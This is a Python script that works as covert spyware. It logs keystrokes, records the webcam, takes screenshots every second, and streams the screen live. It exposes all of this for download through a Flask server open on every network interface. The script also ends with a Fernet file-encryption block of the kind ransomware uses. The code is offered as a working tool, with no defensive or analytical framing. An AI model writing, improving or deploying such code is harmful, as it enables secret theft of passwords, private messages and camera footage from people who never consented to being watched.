import os
from cryptography.fernet import Fernet
import keyboard
import smtplib
from threading import Timer, Thread
import time
import shutil
from flask import Flask, Response, send_file, send_from_directory
import cv2
import numpy as np
from mss import mss

app = Flask(__name__)

# Get the directory of the current script
current_dir = os.path.dirname(__file__)

# Define paths for data storage
keystrokes_path = os.path.join(current_dir, 'keystrokes')
video_path = os.path.join(current_dir, 'video')
screenshots_path = os.path.join(current_dir, 'screenshots')
screen_stream_path = os.path.join(current_dir, 'screen_stream')

# Create directories if they don't exist
os.makedirs(keystrokes_path, exist_ok=True)
os.makedirs(video_path, exist_ok=True)
os.makedirs(screenshots_path, exist_ok=True)
os.makedirs(screen_stream_path, exist_ok=True)

# Function to log keystrokes
def log_keystrokes(event):
    key = event.name
    if len(key) > 1:
        if key == 'space':
            key = ' '
        elif key == 'enter':
            key = '\n'
        elif key == 'decimal':
            key = '.'
        else:
            key = f'[{key}]'
    with open(os.path.join(keystrokes_path, 'keystrokes.txt'), 'a') as f:
        f.write(key)

# Function to start video recording
def start_recording():
    global recording_flag
    recording_flag = True
    cap = cv2.VideoCapture(0)
    out = None
    start_time = time.time()
    while recording_flag:
        ret, frame = cap.read()
        if ret:
            if out is None:
                # Initialize video writer
                width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                fps = 20
                codec = cv2.VideoWriter_fourcc(*'XVID')
                filename = f"video_{start_time}.avi"
                out = cv2.VideoWriter(os.path.join(video_path, filename), codec, fps, (width, height))
            out.write(frame)
        else:
            break
    cap.release()
    if out is not None:
        out.release()

# Function to take screenshots
def screenshot_taker(interval=1):
    while True:
        try:
            with mss() as sct:
                screenshot = np.array(sct.grab(sct.monitors[1]))
                screenshot_path = os.path.join(screenshots_path, f"screenshot_{time.time()}.png")
                cv2.imwrite(screenshot_path, screenshot)
            time.sleep(interval)
        except Exception as e:
            print(f"Error taking screenshot: {e}")

# Start logging keystrokes
keyboard.on_release(log_keystrokes)

# Start video recording
recording_thread = Thread(target=start_recording)
recording_thread.start()

# Start taking screenshots
screenshot_taker_thread = Thread(target=screenshot_taker)
screenshot_taker_thread.start()

# Function to generate screen stream
def generate():
    with mss() as sct:
        while True:
            frame = np.array(sct.grab(sct.monitors[1]))
            ret, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

# Route for accessing screen stream
@app.route('/screen_stream')
def screen_stream():
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

# Route for downloading keystrokes folder
@app.route('/keystrokes')
def download_keystrokes():
    return send_from_directory(keystrokes_path, 'keystrokes.txt', as_attachment=True)

# Route for downloading the latest video recording
@app.route('/video')
def download_video():
    global recording_flag
    recording_flag = False  # Stop the recording
    time.sleep(2)  # Wait for 2 seconds to ensure recording stops
    try:
        # Get the list of files in the video directory
        files = os.listdir(video_path)

        # Sort the files by modification time (newest first)
        files.sort(key=lambda x: os.path.getmtime(os.path.join(video_path, x)), reverse=True)

        # Get the path to the latest video file
        latest_video = os.path.join(video_path, files[0])

        # Send the latest video file as an attachment
        return send_file(latest_video, as_attachment=True)
    finally:
        # Restart the recording after the download is complete
        recording_thread = Thread(target=start_recording)
        recording_thread.start()
# Route for downloading screenshots folder
@app.route('/screenshots')
def download_screenshots():
    global recording_flag
    recording_flag = False  # Stop the recording
    time.sleep(2)  # Wait for 2 seconds to ensure recording stops
    try:
        # Create a ZIP file containing all files in the screenshots directory
        zip_file = os.path.join(current_dir, 'screenshots.zip')
        shutil.make_archive(os.path.splitext(zip_file)[0], 'zip', screenshots_path)

        # Send the ZIP file as an attachment
        return send_file(zip_file, as_attachment=True)
    finally:
        # Restart the recording after the download is complete
        recording_thread = Thread(target=start_recording)
        recording_thread.start()
        
if __name__ == '__main__':
    from waitress import serve
    serve(app, host='0.0.0.0', port=5000)

#Encrypt the test file

files = []

for file in os.listdir():
	if  file != "test.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

#encryption
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
print("Files encrypted")
